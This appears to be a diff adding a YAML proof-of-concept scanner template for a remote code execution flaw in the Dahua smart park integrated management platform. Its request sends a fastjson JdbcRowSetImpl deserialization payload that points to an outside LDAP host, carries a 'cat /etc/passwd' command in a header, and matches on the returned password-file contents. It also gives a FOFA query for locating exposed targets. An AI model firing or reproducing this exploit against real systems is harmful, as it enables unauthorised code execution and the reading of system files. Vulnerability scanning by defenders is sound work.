@@ -1,0 +1,21 @@
+id: poc-yaml-dahua-zhyq-ipms-barpay-pay-rce
+info:
+  name: 大华智慧园区综合管理平台 ipms-barpay-pay 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 大华智慧园区综合管理平台
+  fofa: app="dahua-智慧园区综合管理平台"
+requests:
+- method: POST
+  path: /ipms/barpay/pay
+  headers:
+    Content-Type: application/json
+    Cmd: cat /etc/passwd
+  data: '{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://gobygo.net/A4",
+    "autoCommit": true}'
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && !contains(headers,"Content-Type")
+variables: {}
+transport: http
